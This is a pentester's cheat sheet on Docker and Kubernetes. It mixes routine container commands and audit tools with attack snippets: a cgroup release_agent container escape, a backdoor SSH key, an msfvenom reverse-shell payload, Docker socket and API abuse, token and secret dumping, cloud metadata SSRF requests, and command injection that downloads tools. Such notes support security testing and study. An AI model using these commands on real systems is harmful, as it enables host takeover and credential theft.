# Docker && Kubernetes

## Basic Docker commands

```bash
# Search in docker hub
docker search wpscan

# Run docker container from docker hub
docker run ubuntu:latest echo "Welcome to Ubuntu"

# Run docker container from docker hub with interactive tty
docker run --name samplecontainer -it ubuntu:latest /bin/bash

# List running containers
docker ps

# List all containers
docker ps -a

# List docker images
docker images

# Run docker in background
docker run --name pingcontainer -d alpine:latest ping 127.0.0.1 -c 50

# Get container logs (follow)
docker logs -f pingcontainer

# Run container service in specified port
docker run -d --name nginxalpine -p 7777:80 nginx:alpine

# Access tty of running container
docker exec -it nginxalpine sh

# Get low-level info of docker object
docker inspect (container or image)

# Show image history
docker history jess/htop

# Stop container
docker stop dummynginx

# Remove container
docker rm dummynginx

# Run docker with specified PID namespace
docker run --rm -it --pid=host jess/htop

# Show logs (examples)
docker logs containername
docker logs -f containername

# Show service defined logs
docker service logs

# Look generated real time events by docker runtime
docker system events
docker events --since '10m'
docker events --filter 'image=alpine'
docker events --filter 'event=stop'

# Compose application (set up multicontainer docker app)
docker-compose up -d

# List docker volumes
docker volume ls

# Create volume
docker volume create vol1

# List docker networks
docker network ls

# Create docker network
docker network create net1

# Remove capability of container
docker run --rm -it --cap-drop=NET_RAW alpine sh

# Check capabilities inside container (example image id)
docker run --rm -it 71aa5f3f90dc bash
capsh --print

# Run full privileged container
docker run --rm -it --privileged=true 71aa5f3f90dc bash
capsh --print

# From full privileged container you can access host devices
more /dev/kmsg

# Creating container groups
docker run -d --name='low_priority' --cpuset-cpus=0 --cpu-shares=10 alpine md5sum /dev/urandom
docker run -d --name='high_priority' --cpuset-cpus=0 --cpu-shares=50 alpine md5sum /dev/urandom

# Stopping cgroups
docker stop low_priority high_priority

# Remove cgroups
docker rm low_priority high_priority

# Setup docker swarm cluster
docker swarm init

# Check swarm nodes
docker node ls

# Start new service in cluster
docker service create --replicas 1 --publish 5555:80 --name nginxservice nginx:alpine

# List services
docker service ls

# Inspect service
docker service inspect --pretty nginxservice

# Remove service
docker service rm nginxservice

# Leave cluster
docker swarm leave (--force if only one node)

# Start portainer
docker run -d -p 9000:9000 --name portainer \
  --restart always -v /var/run/docker.sock:/var/run/docker.sock \
  -v /opt/portainer:/data portainer/portainer
```

Tools referenced:

* https://github.com/lightspin-tech/red-kube

***

## Image integrity & vulnerability checks

```bash
# Get image checksum
docker images --digests ubuntu

# Check content trust to get signatures
docker trust inspect mediawiki --pretty

# Check vulns in container
# - Look vulns in base image
# - Use https://vulners.com/audit to check for docker packages
# - Inside any container:
cat /etc/issue
dpkg-query -W -f='${Package} ${Version} ${Architecture}\n'

# Using Trivy
# https://github.com/aquasecurity/trivy
trivy image knqyf263/vuln-image:1.2.3

# Check metadata, secrets, env variables
docker inspect <image name>
docker inspect <container name>

# Review image history
docker history image:latest

# Inspect everything
docker volume inspect wordpress_db_data
docker network inspect wordpress_default

# Inspect volume mountpoints
docker volume inspect whatever
cd /var/lib/docker/volumes/whatever

# Integrity check for changed files
docker diff imagename

# Check if you're under a container
# https://github.com/genuinetools/amicontained#usage

# Docker Bench Security (Security Auditor)
cd /opt/docker-bench-security
sudo bash docker-bench-security.sh
```

***

## Detecting if inside a Docker container (quick checks)

* MAC Address ranges: Docker uses a range from 02:42:ac:11:00:00 to 02:42:ac:11:ff:ff
* List of running processes (ps aux) — a small number of processes can indicate a container
* CGROUPs: cat /proc/1/cgroup — should show docker process running
* Check for existence of docker.sock: ls -al /var/run/docker.sock
* Check for container capabilities: capsh --print
* On pentests, check for TCP ports 2375 and 2376 — default docker daemon ports

***

## Escape NET\_ADMIN Docker container (notes / snippets)

```bash
# Check if you're NET_ADMIN
ip link add dummy0 type dummy
ip link delete dummy0

# If it works, this script executes 'ps aux' on the host (example)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

You can replace the 'ps aux' command with other actions (example given: appending an SSH key):

```bash
cat id_dsa.pub >> /root/.ssh/authorized_keys
```

***

## Attack insecure volume mounts (post-RCE in container)

Commands executed inside compromised container:

```bash
# Check for docker socket
ls -l /var/run/docker.sock

# Use docker client in container to interact with host via unix socket
./docker -H unix:///var/run/docker.sock ps
./docker -H unix:///var/run/docker.sock images
```

***

## Attack: Docker API exposed (misconfiguration)

```bash
# Query Docker API
curl 10.11.1.111:2375/images/json | jq .

# Then run commands on host via Docker API
docker -H tcp://10.11.1.111:2375 ps
docker -H tcp://10.11.1.111:2375 images
```

***

## Audit Docker runtime & registries

Runtime checks:

```bash
# Host with multiple dockers running
docker system info

# Check docker daemon systemd unit to see if API is exposed
cat /lib/systemd/system/docker.service

# Check if docker socket is running in any container
docker inspect | grep -i '/var/run/'

# Inspect docker related files
ls -l /var/lib/docker/

# Check for secret folders
ls -l /var/run/
ls -l /run/
```

Public registry (default registry port 5000):

```bash
# Check if registry is up
curl -s http://localhost:5000/v2/_catalog | jq .

# Get tags of an image
curl -s http://localhost:5000/v2/devcode/tags/list | jq .

# Download image locally
docker pull localhost:5000/devcode:latest

# Access container to review it
docker run --rm -it localhost:5000/devcode:latest sh
```

Private registry examples and notes:

```bash
# Check catalog
curl 10.11.1.111:5000/v2/_catalog

# Get image tags
curl 10.11.1.111:5000/v2/privatecode/tags/list

# Add --insecure-registry to Docker daemon (example edit)
# vi /lib/systemd/system/docker.service
# ExecStart=/usr/bin/dockerd -H fd:// --insecure-registry 10.11.1.111:5000

# Restart docker service
sudo systemctl daemon-reload
sudo service docker restart

# Pull the image
docker pull 10.11.1.111:5000/privatecode:whatevertag

# Enter inside container and enumerate
docker run --rm -it 10.11.1.111:5000/privatecode:golang-developer-team sh
cd /app
ls -la
```

To check configured credentials on a host:

```bash
cat ~/.docker/config.json
```

***

## Attack container capabilities (notes)

* Check capabilities: capsh --print
* Example workflow:
  * Upload payload (e.g., msfvenom raw payload)
  * Identify any process running as root: ps aux | grep root
  * Use injector to inject into a target PID running as root

Example payload generation:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f raw -o payload.bin
```

***

## Useful tools (Docker / Container)

* https://github.com/anchore/grype
* https://github.com/aquasecurity/trivy
* https://github.com/cr0hn/dockerscan
* https://github.com/P3GLEG/Whaler
* https://github.com/RhinoSecurityLabs/ccat
* https://github.com/stealthcopter/deepce

***

## Kubernetes — Pentester Notes

Links:

* Kubernetes for Pentesters: Part 1 — https://trustedsec.com/blog/kubernetes-for-pentesters-part-1
* A Pentester’s Approach to Kubernetes Security — https://blog.appsecco.com/a-pentesters-approach-to-kubernetes-security-part-1-2b328252954a and part 2
* Penetration testing a Kubernetes environment — https://bobvanderstaak.medium.com/penetration-testing-a-kubernetes-environment-72719f9e1010

### Concepts

* Kubernetes is a security orchestrator.
* Kubernetes master provides an API to interact with nodes.
* Each Kubernetes node runs kubelet (interacts with API) and kube-proxy (reflects Kubernetes networking services on each node).
* Kubernetes objects are abstractions of states of your system:
  * Pods: collection of containers sharing network and namespace on the same node.
  * Services: group of pods running in the cluster.
  * Volumes: directory accessible to all containers in a pod; solves ephemeral storage problems when containers restart.
  * Namespaces: scope of Kubernetes objects, like a workspace (e.g., dev-space).

### Common kubectl commands

```bash
# kubectl CLI for interacting with clusters

# Get info
kubectl cluster-info

# Get other objects info
kubectl get nodes
kubectl get pods
kubectl get services

# Deploy
kubectl run nginxdeployment --image=nginx:alpine

# Port forward to local machine
kubectl port-forward <PODNAME> 1234:80

# Deleting things
kubectl delete pod

# Shell in pod
kubectl exec -it <PODNAME> sh

# Check pod log
kubectl logs <PODNAME>

# List API resources
kubectl api-resources

# Check permissions
kubectl auth can-i create pods

# Get secrets
kubectl get secrets <SECRETNAME> -o yaml

# Get more info for a specific pod
kubectl describe pod <PODNAME>

# Get cluster dump
kubectl cluster-info dump
```

Known vulnerabilities (examples):

* CVE-2016-9962
* CVE-2018-1002105
* CVE-2019-5736
* CVE-2019-9901

### External recon

```bash
# Find subdomains like k8s.target.tld
# Search for yaml files on GitHub

# Check etcd (if exposed)
etcdctl –endpoints=http://<MASTER-IP>:2379 get / –prefix –keys-only

# Check pods info disclosure on kubelet read-only port
curl http://<external-IP>:10255/pods
```

Common open ports and endpoints (images shown in original content):

* See images in original source for common ports and endpoints.

### Quick attacks & enumeration

```bash
# Dump all API resources into yaml files
for res in $(kubectl api-resources -o name); do
  kubectl get "${res}" -A -o yaml > ${res}.yaml
done

# Check for anonymous access
curl -k https://<master_ip>:<port>
etcdctl –endpoints=http://<MASTER-IP>:2379 get / –prefix –keys-only
curl http://<external-IP>:10255/pods

# Dump token from inside a pod
kubectl exec -ti <pod> -n <namespace> cat /run/secrets/kubernetes.io/serviceaccount/token

# Dump all tokens from secrets
kubectl get secrets -A -o yaml | grep " token:" | sort | uniq > alltokens.txt

# Standard query for creds dump:
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/<namespace>/secrets/

# This endpoint may also work:
# /api/v1/namespaces/kube-system/secrets/
```

### Attack: Private registry misconfiguration (example)

```bash
# If app allows LFI, read docker config
cat /root/.docker/config.json

# Use JSON key for gcr login
docker login -u _json_key -p "$(cat config.json)" https://gcr.io

# Pull private registry image
docker pull gcr.io/training-automation-stuff/backend-source-code:latest

# Inspect & enumerate image
docker run --rm -it gcr.io/training-automation-stuff/backend-source-code:latest

# Check for secrets inside container
ls -l /var/run/secrets/kubernetes.io/serviceaccount/

# Check environment vars
printenv
```

### Attack: Cluster metadata via SSRF

```bash
# Example requests to metadata endpoints
curl http://169.254.169.254/computeMetadata/v1/
curl http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env
```

### Attack: Escaping pod volume mounts to access node/host

```bash
# If webapp executes ping and allows appending commands
ping whatever; ls -l /custom/docker/

# Download docker client into container
ping whatever; wget https://download.docker.com/linux/static/stable/x86_64/docker-18.09.1.tgz -O /root/docker-18.09.1.tgz
ping whatever; tar -xvzf /root/docker-18.09.1.tgz -C /root/
ping whatever; /root/docker/docker -H unix:///custom/docker/docker.sock ps
ping whatever; /root/docker/docker -H unix:///custom/docker/docker.sock images
```

### Kubernetes tools referenced

```shellscript
# kube-bench - security checker
kubectl apply -f kube-bench-node.yaml
kubectl get pods --selector job-name=kube-bench-node
kubectl logs kube-bench-podname

# kube-hunter
# https://github.com/aquasecurity/kube-hunter
kube-hunter --remote some.node.com

# kubeaudit
./kubeaudit all

# kubeletctl
# https://github.com/cyberark/kubeletctl
kubeletctl scan rce XXXXXXXX

# CDK
# https://github.com/cdk-team/CDK
cdk evaluate

# Api audit
# https://github.com/averonesis/kubolt

# PurplePanda
# https://github.com/carlospolop/PurplePanda
```

Other tools listed earlier:

* https://github.com/anchore/grype

***

## Related links

{% embed url="https://www.evasec.io/blog/argo-workflows-uncovering-the-hidden-misconfigurations" %}

***

